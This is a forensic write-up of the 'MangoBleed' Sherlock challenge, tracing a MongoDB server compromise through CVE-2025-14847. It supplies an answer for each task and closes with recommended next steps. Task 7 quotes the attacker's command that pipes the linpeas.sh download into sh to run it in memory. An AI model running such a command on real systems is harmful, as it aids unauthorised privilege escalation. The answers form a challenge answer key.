# MangoBleed
![mb.png](/MangoBleed/screenshots/mb.png)

# Sherlock Scenario
> You were contacted early this morning to handle a high‑priority incident involving a suspected compromised server. The host, mongodbsync, is a secondary MongoDB server. According to the administrator, it's maintained once a month, and they recently became aware of a vulnerability referred to as MongoBleed. As a precaution, the administrator has provided you with root-level access to facilitate your investigation.
> You have already collected a triage acquisition from the server using UAC. Perform a rapid triage analysis of the collected artifacts to determine whether the system has been compromised, identify any attacker activity (initial access, persistence, privilege escalation, lateral movement, or data access/exfiltration), and summarize your findings with an initial incident assessment and recommended next steps.

# Task 1: What is the CVE ID designated to the MongoDB vulnerability explained in the scenario?

The vulnerability referenced in the scenario is MongoBleed, which is designated as CVE-2025-14847.

Ans: `CVE-2025-14847`

# Task 2: What is the version of MongoDB installed on the server that the CVE exploited?

After extracting the provided artifacts, we navigated to `\[root]\var\log\mongodb` and examined the `mongod.log` file to identify the installed MongoDB version.

![mongover.png](/MangoBleed/screenshots/mongover.png)

Ans: `8.0.16`

# Task 3: Analyze the MongoDB logs to identify the attacker's remote IP address used to exploit the CVE.

Upon a preliminary review of the mongod.log file, a suspicious IP address was identified in the logs.

![mongoattip.png](/MangoBleed/screenshots/mongoattip.png)

Ans: `65.0.76.43`

# Task 4: Based on the MongoDB logs, determine the exact date and time the attacker’s exploitation activity began (the earliest confirmed malicious event)

A manual review of the log entries was conducted to identify the first occurrence of the suspicious IP address. This event represents the earliest confirmed malicious activity associated with the attacker.

![date.png](/MangoBleed/screenshots/date.png)

Ans: `2025-12-29 05:25:52`

# Task 5: Using the MongoDB logs, calculate the total number of malicious connections initiated by the attacker.

By reviewing the end of the logs, we identified a total of 37,630 connections initiated by the attacker. Since each connection generates both a connection and a disconnection event, the total number of related log entries is calculated by multiplying this value by two, resulting in 75,260 events.

![conn.png](/MangoBleed/screenshots/conn.png)

Ans: `75260`

# Task 6: The attacker gained remote access after a series of brute‑force attempts. The attack likely exposed sensitive information, which enabled them to gain remote access. Based on the logs, when did the attacker successfully gain interactive hands-on remote access?

Reviewing the `auth.log` file located under `/var/log/`, we identified authentication events indicating that the attacker successfully established interactive remote access.

![brutefdate.png](/MangoBleed/screenshots/brutefdate.png)

Ans: `2025-12-29 05:40:03`

# Task 7: Identify the exact command line the attacker used to execute an in‑memory script as part of their privilege‑escalation attempt.

Reviewing the `.bash_history` file of the `mongoadmin` user, located under `/home/mongoadmin`, we identified the following command executed by the attacker as part of the privilege-escalation attempt:

![bashhist.png](/MangoBleed/screenshots/bashhist.png)

The command downloads `linpeas.sh` directly from GitHub and pipes it to `sh`, allowing the script to be executed directly without being written to disk first.

Ans: `curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh`

# Task 8: The attacker was interested in a specific directory and also opened a Python web server, likely for exfiltration purposes. Which directory was the target?

Based on the previous screenshot, the attacker appeared to be interested in the `/var/lib/mongodb` directory and attempted to start a Python HTTP server from this location. This could have been used to make the directory's contents accessible over the network and potentially facilitate data exfiltration.

Ans: `/var/lib/mongodb`

## Conclusion

The investigation confirms that the `mongodbsync` server was compromised through the MongoDB vulnerability **CVE-2025-14847 (MongoBleed)**. The affected MongoDB instance was running version **8.0.16**, and the earliest confirmed malicious activity originated from the attacker IP address **65.0.76.43** at **2025-12-29 05:25:52**, followed by a large number of malicious connections.

The subsequent analysis of `auth.log` confirmed that the attacker successfully obtained interactive remote access at **05:40:03**. Further investigation of the `mongoadmin` user's `.bash_history` revealed the execution of **LinPEAS**, indicating an attempt to enumerate the system for potential privilege-escalation opportunities.

The attacker also accessed the `/var/lib/mongodb` directory and attempted to start a Python HTTP server from this location. While this activity is consistent with an attempt to make MongoDB data accessible over the network and potentially facilitate exfiltration, the available evidence does not by itself confirm that the data was successfully exfiltrated.

Overall, the evidence indicates a successful compromise involving **initial exploitation, remote access, post-compromise reconnaissance, and potential data-access/exfiltration activity**. The affected server should be treated as compromised, isolated from the network, and subjected to a full forensic investigation. MongoDB should also be upgraded to a patched version, exposed services and credentials should be reviewed and rotated where necessary, and additional monitoring should be implemented to identify any related attacker activity on other systems.

![mbpwned.png](/MangoBleed/screenshots/mbpwned.png)
